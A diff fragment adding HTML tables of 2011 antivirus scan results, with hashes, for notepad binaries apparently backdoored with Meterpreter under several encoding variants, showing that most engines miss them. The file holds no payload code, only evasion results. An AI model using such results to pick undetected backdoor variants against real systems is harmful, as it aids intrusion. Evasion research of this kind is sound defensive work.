+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 13:22:34 (UTC)</td>
+     </tr>
+ </table>
+ 
+<h2>notepad_meterpreter_badep</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.10.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6279</td>
+         <td>2011.07.09</td>
+         <td class="positive">a variant of Win32/Kryptik.EVQ</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9816</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> ca64f5016c6dfb90d517ded4074444e7</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> c5453ce82daa312538f9d2c4a62de678c20cc29c</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 8d64cdea4caed41c10f4e8df3cbdd04000bab7251d5995d14568c6715018e55e</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 18:15:01 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>notepad_none_badep</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.10.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6279</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9816</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> db9c0ca624fa95fb3b71832befbd9655</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> f79cde024a8a744878019ce420759aa81a4951ab</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> d25468d87e4e677ea106bfd4da3f85e6c568556d933c082106fd34760b013aa4</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 18:16:53 (UTC)</td>
+     </tr>
+ </table>
+ 
+<h2>notepad_meterpreter_xorep</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.10.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.09</td>
+         <td class="positive">a variant of Win32/Rozena.AH</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9817</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 88df7d9f6f6a813898c0a51725af249a</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 76d7c6f628bcb5980dd25fefb5299f0516a2e127</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> a8a0e6794092393aa48fa99b67c8e79da07a037bf3281d17233fe7a848a373f7</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 19:39:55 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>notepad_none_xorep</h2>
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.10.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9328</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan.Swrort.1</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9817</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> d8b595c0b1847cc4b8d9336559a9249f</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 26462902466e2067a02cc1459003fb92091ffe1b</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> a5a1537c76fc0c9776b1ae30b4b2c9562d17f257aa735f44e02aeeef3ce61e96</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 19:41:44 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>notepad_meterpreter_norwx</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.10.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td class="positive">Win32/Heur</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td class="positive">Trojan.Packed.196</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
